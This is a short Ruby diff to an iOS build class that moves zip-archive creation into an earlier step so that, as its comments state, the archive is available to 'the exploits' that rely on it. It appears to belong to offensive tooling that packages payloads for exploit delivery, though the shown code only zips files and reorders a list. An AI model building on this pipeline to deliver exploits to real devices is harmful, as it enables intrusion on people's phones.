@@ -84,18 +84,22 @@ class BuildIOS < Build
     file.write content
     file.close
 
-  end
-
-  def pack(params)
-    trace :debug, "Build: pack: #{params}"
-
+    # this is useful to have all the files in one single archive, used by the exploits
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
       @outputs.each do |output|
         z.file.open(output, "wb") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
       end
     end
 
-    # this is the only file we need to output after this point
+    # put it as the first file of the outputs, since the exploit relies on this
+    @outputs.insert(0, 'output.zip')
+
+  end
+
+  def pack(params)
+    trace :debug, "Build: pack: #{params}"
+
+    # we already have this file from the previous step
     @outputs = ['output.zip']
 
   end
